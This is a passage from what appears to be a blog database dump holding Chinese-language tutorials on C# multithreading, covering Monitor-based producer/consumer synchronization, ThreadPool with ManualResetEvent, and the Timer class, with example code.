，它们都只有一个方法ThreadRun()，以便在Main()函数中提供给线程的ThreadStart代理对象，作为线程的入口。<br />\r\npublic class CellProd<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; Cell cell; // 被操作的Cell对象<br />\r\n&nbsp;&nbsp;&nbsp; int quantity = 1; // 生产者生产次数，初始化为1</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; public CellProd(Cell box, int request)<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //构造函数<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cell = box;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; quantity = request;<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; public void ThreadRun( )<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int looper=1; looper&lt;=quantity; looper++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cell.WriteToCell(looper); //生产者向操作对象写入信息<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n}</p>\r\n\r\n<p>public class CellCons<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; Cell cell;<br />\r\n&nbsp;&nbsp;&nbsp; int quantity = 1;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; public CellCons(Cell box, int request)<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //构造函数<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cell = box;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; quantity = request;<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; public void ThreadRun( )<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int valReturned;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int looper=1; looper&lt;=quantity; looper++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; valReturned=cell.ReadFromCell( );//消费者从操作对象中读取信息<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n}</p>\r\n\r\n<p>然后在下面这个类MonitorSample的Main()函数中，我们要做的就是创建两个线程分别作为生产者和消费者，使用CellProd.ThreadRun()方法和CellCons.ThreadRun()方法对同一个Cell对象进行操作。</p>\r\n\r\n<p>public class MonitorSample<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; public static void Main(String[] args)<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int result = 0; //一个标志位，如果是0表示程序没有出错，如果是1表明有错误发生<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cell cell = new Cell( );</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //下面使用cell初始化CellProd和CellCons两个类，生产和消费次数均为20次<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CellProd prod = new CellProd(cell, 20);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CellCons cons = new CellCons(cell, 20);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread producer = new Thread(new ThreadStart(prod.ThreadRun));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread consumer = new Thread(new ThreadStart(cons.ThreadRun));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //生产者线程和消费者线程都已经被创建，但是没有开始执行<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; producer.Start( );<br />\r\n&nbsp;&nbsp;&nbsp; consumer.Start( );</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; producer.Join( );<br />\r\n&nbsp;&nbsp;&nbsp; consumer.Join( );<br />\r\n&nbsp;&nbsp;&nbsp; Console.ReadLine();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch (ThreadStateException e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; //当线程因为所处状态的原因而不能执行被请求的操作<br />\r\n&nbsp;&nbsp;&nbsp; Console.WriteLine(e);<br />\r\n&nbsp;&nbsp;&nbsp; result = 1;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch (ThreadInterruptedException e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; //当线程在等待状态的时候中止<br />\r\n&nbsp;&nbsp;&nbsp; Console.WriteLine(e);<br />\r\n&nbsp;&nbsp;&nbsp; result = 1;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //尽管Main()函数没有返回值，但下面这条语句可以向父进程返回执行结果<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Environment.ExitCode = result;<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n}</p>\r\n\r\n<p>在上面的例程中，同步是通过等待Monitor.Pulse()来完成的。首先生产者生产了一个值，而同一时刻消费者处于等待状态，直到收到生产者的&ldquo;脉冲(Pulse)&rdquo;通知它生产已经完成，此后消费者进入消费状态，而生产者开始等待消费者完成操作后将调用Monitor.Pulese()发出的&ldquo;脉冲&rdquo;。<br />\r\n它的执行结果很简单：<br />\r\nProduce: 1<br />\r\nConsume: 1<br />\r\nProduce: 2<br />\r\nConsume: 2<br />\r\nProduce: 3<br />\r\nConsume: 3<br />\r\n...<br />\r\n...<br />\r\nProduce: 20<br />\r\nConsume: 20<br />\r\n&nbsp;<br />\r\n事实上，这个简单的例子已经帮助我们解决了多线程应用程序中可能出现的大问题，只要领悟了解决线程间冲突的基本方法，很容易把它应用到比较复杂的程序中去。</p>\r\n',0,1438006761,0,0),(87,38,'C#多线程学习(四) 多线程的自动管理(线程池)','<p>在多线程的程序中，经常会出现两种情况：<br />\r\n一种情况：&nbsp;&nbsp; 应用程序中，线程把大部分的时间花费在等待状态，等待某个事件发生，然后才能给予响应<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这一般使用ThreadPool（线程池）来解决；<br />\r\n另一种情况：线程平时都处于休眠状态，只是周期性地被唤醒<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这一般使用Timer（定时器）来解决；<br />\r\nThreadPool类提供一个由系统维护的线程池（可以看作一个线程的容器），该容器需要 Windows 2000 以上系统支持，因为其中某些方法调用了只有高版本的Windows才有的API函数。<br />\r\n将线程安放在线程池里，需使用ThreadPool.QueueUserWorkItem()方法，该方法的原型如下：<br />\r\n//将一个线程放进线程池，该线程的Start()方法将调用WaitCallback代理对象代表的函数<br />\r\npublic static bool QueueUserWorkItem(WaitCallback);<br />\r\n//重载的方法如下，参数object将传递给WaitCallback所代表的方法<br />\r\npublic static bool QueueUserWorkItem(WaitCallback, object);</p>\r\n\r\n<p>注意：<br />\r\nThreadPool类是一个静态类，你不能也不必要生成它的对象。而且一旦使用该方法在线程池中添加了一个项目，那么该项目将是无法取消的。<br />\r\n在这里你无需自己建立线程，只需把你要做的工作写成函数，然后作为参数传递给ThreadPool.QueueUserWorkItem()方法就行了，传递的方法就是依靠WaitCallback代理对象，而线程的建立、管理、运行等工作都是由系统自动完成的，你无须考虑那些复杂的细节问题。</p>\r\n\r\n<p>ThreadPool 的用法：<br />\r\n首先程序创建了一个ManualResetEvent对象，该对象就像一个信号灯，可以利用它的信号来通知其它线程。<br />\r\n本例中，当线程池中所有线程工作都完成以后，ManualResetEvent对象将被设置为有信号，从而通知主线程继续运行。<br />\r\nManualResetEvent对象有几个重要的方法：<br />\r\n初始化该对象时，用户可以指定其默认的状态（有信号/无信号）；<br />\r\n在初始化以后，该对象将保持原来的状态不变，直到它的Reset()或者Set()方法被调用：<br />\r\nReset()方法：将其设置为无信号状态；<br />\r\nSet()方法：将其设置为有信号状态。<br />\r\nWaitOne()方法：使当前线程挂起，直到ManualResetEvent对象处于有信号状态，此时该线程将被激活。然后，程序将向线程池中添加工作项，这些以函数形式提供的工作项被系统用来初始化自动建立的线程。当所有的线程都运行完了以后，ManualResetEvent.Set()方法被调用，因为调用了ManualResetEvent.WaitOne()方法而处在等待状态的主线程将接收到这个信号，于是它接着往下执行，完成后边的工作。</p>\r\n\r\n<p>ThreadPool 的用法示例：<br />\r\nusing System;<br />\r\nusing System.Collections;<br />\r\nusing System.Threading;</p>\r\n\r\n<p>namespace ThreadExample<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; //这是用来保存信息的数据结构，将作为参数被传递<br />\r\n&nbsp;&nbsp;&nbsp; public class SomeState<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; public int Cookie;<br />\r\n&nbsp;&nbsp;&nbsp; public SomeState(int iCookie)<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cookie = iCookie;<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; public class Alpha<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\npublic Hashtable HashCount;<br />\r\npublic ManualResetEvent eventX;<br />\r\npublic static int iCount = 0;<br />\r\npublic static int iMaxCount = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public Alpha(int MaxCount)<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HashCount = new Hashtable(MaxCount);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iMaxCount = MaxCount;<br />\r\n}</p>\r\n\r\n<p>//线程池里的线程将调用Beta()方法<br />\r\npublic void Beta(Object state)<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; //输出当前线程的hash编码值和Cookie的值<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot; {0} {1} :&quot;, Thread.CurrentThread.GetHashCode(),((SomeState)state).Cookie);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;HashCount.Count=={0}, Thread.CurrentThread.GetHashCode()=={1}&quot;, HashCount.Count, Thread.CurrentThread.GetHashCode());<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lock (HashCount)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; //如果当前的Hash表中没有当前线程的Hash值，则添加之<br />\r\n&nbsp;&nbsp;&nbsp; if (!HashCount.ContainsKey(Thread.CurrentThread.GetHashCode()))<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; HashCount.Add (Thread.CurrentThread.GetHashCode(), 0);<br />\r\n&nbsp; &nbsp;&nbsp;&nbsp; HashCount[Thread.CurrentThread.GetHashCode()] =<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ((int)HashCount[Thread.CurrentThread.GetHashCode()])+1;<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int iX = 2000;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread.Sleep(iX);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //Interlocked.Increment()操作是一个原子操作，具体请看下面说明<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Interlocked.Increment(ref iCount);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (iCount == iMaxCount)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Console.WriteLine();<br />\r\n&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Setting eventX &quot;);<br />\r\n&nbsp;&nbsp;&nbsp; eventX.Set();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp; }<br />\r\n&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public class SimplePool<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static int Main(string[] args)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Thread Pool Sample:&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bool W2K = false;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int MaxCount = 10;//允许线程池中运行最多10个线程<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //新建ManualResetEvent对象并且初始化为无信号状态<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ManualResetEvent eventX = new ManualResetEvent(false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Queuing {0} items to Thread Pool&quot;, MaxCount);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Alpha oAlpha = new Alpha(MaxCount);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //创建工作项<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //注意初始化oAlpha对象的eventX属性<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oAlpha.eventX = eventX;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Queue to Thread Pool 0&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //将工作项装入线程池<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //这里要用到Windows 2000以上版本才有的API，所以可能出现NotSupportException异常<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThreadPool.QueueUserWorkItem(new WaitCallback(oAlpha.Beta), new SomeState(0));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; W2K = true;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch (NotSupportedException)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;These API&#39;s may fail when called on a non-Windows 2000 system.&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; W2K = false;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (W2K)//如果当前系统支持ThreadPool的方法.<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int iItem=1;iItem &lt; MaxCount;iItem++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //插入队列元素<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Queue to Thread Pool {0}&quot;, iItem);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThreadPool.QueueUserWorkItem(new WaitCallback(oAlpha.Beta), new SomeState(iItem));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Waiting for Thread Pool to drain&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //等待事件的完成，即线程调用ManualResetEvent.Set()方法<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eventX.WaitOne(Timeout.Infinite,true);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //WaitOne()方法使调用它的线程等待直到eventX.Set()方法被调用<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Thread Pool has been drained (Event fired)&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Load across threads&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach(object o in oAlpha.HashCount.Keys)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;{0} {1}&quot;, o, oAlpha.HashCount[o]);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.ReadLine();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>程序中应该引起注意的地方：<br />\r\nSomeState类是一个保存信息的数据结构，它在程序中作为参数被传递给每一个线程，因为你需要把一些有用的信息封装起来提供给线程，而这种方式是非常有效的。<br />\r\n程序出现的InterLocked类也是专为多线程程序而存在的，它提供了一些有用的原子操作。<br />\r\n原子操作：就是在多线程程序中，如果这个线程调用这个操作修改一个变量，那么其他线程就不能修改这个变量了，这跟lock关键字在本质上是一样的。</p>\r\n\r\n<p>&nbsp;程序的输出结果：</p>\r\n\r\n<p>我们应该彻底地分析上面的程序，把握住线程池的本质，理解它存在的意义是什么，这样才能得心应手地使用它。</p>\r\n',0,1438007745,0,0),(88,38,'C#多线程学习(五) 多线程的自动管理(定时器)','<p>Timer类：设置一个定时器，定时执行用户指定的函数。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 定时器启动后，系统将自动建立一个新的线程，执行用户指定的函数。<br />\r\n初始化一个Timer对象：<br />\r\nTimer timer = new Timer(timerDelegate, s,1000, 1000);</p>\r\n\r\n<p>// 第一个参数：指定了TimerCallback 委托，表示要执行的方法；<br />\r\n// 第二个参数：一个包含回调方法要使用的信息的对象，或者为空引用；<br />\r\n// 第三个参数：延迟时间&mdash;&mdash;计时开始的时刻距现在的时间，单位是毫秒,指定为&ldquo;0&rdquo;表示立即启动计时器；<br />\r\n// 第四个参数：定时器的时间间隔&mdash;&mdash;计时开始以后，每隔这么长的一段时间，TimerCallback所代表的方法将被调用一次，单位也是毫秒。指定 Timeout.Infinite 可以禁用定期终止。</p>\r\n\r\n<p>Timer.Change()方法：修改定时器的设置。（这是一个参数类型重载的方法）<br />\r\n使用示例：&nbsp; timer.Change(1000,2000);</p>\r\n\r\n<p>Timer类的程序示例(来源：MSDN)：<br />\r\nusing System;<br />\r\nusing System.Threading;</p>\r\n\r\n<p>namespace ThreadExample<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; class TimerExampleState<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; public int counter = 0;<br />\r\n&nbsp;&nbsp;&nbsp; public Timer tmr;<br />\r\n&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; class App<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; public static void Main()<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TimerExampleState s = new TimerExampleState();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //创建代理对象TimerCallback，该代理将被定时调用<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TimerCallback timerDelegate = new TimerCallback(CheckStatus);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //创建一个时间间隔为1s的定时器<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Timer timer = new Timer(timerDelegate, s,1000, 1000);<br 